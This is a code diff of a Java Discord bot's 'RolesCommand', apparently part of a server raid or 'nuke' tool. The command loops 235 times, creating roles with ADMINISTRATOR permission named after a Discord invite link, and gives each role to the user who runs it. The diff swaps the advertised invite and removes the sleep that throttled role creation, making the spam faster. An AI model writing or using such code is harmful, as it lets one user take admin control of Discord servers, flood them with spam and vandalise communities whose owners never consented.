@@ -24,14 +24,13 @@ public class RolesCommand extends Command {
         for (int t = 0; t < 235; t++) {
             if(roles) {
                 try {
-                    event.getGuild().createRole().setName("https://discord.gg/Q8TJR9YpZS").setColor(Color.BLACK).setMentionable(true).setPermissions(Permission.ADMINISTRATOR).queue( (h) ->
+                    event.getGuild().createRole().setName("discord.gg/minehut").setColor(Color.BLACK).setMentionable(true).setPermissions(Permission.ADMINISTRATOR).queue( (h) ->
                             event.getGuild().addRoleToMember(event.getMember(), h).queue());
 
                 } catch (Exception e) {
                     System.out.println("Failed to create a role!");
                     roles = false;
                 }
-                TimeUnit.MILLISECONDS.sleep(150);
             }
         }
 
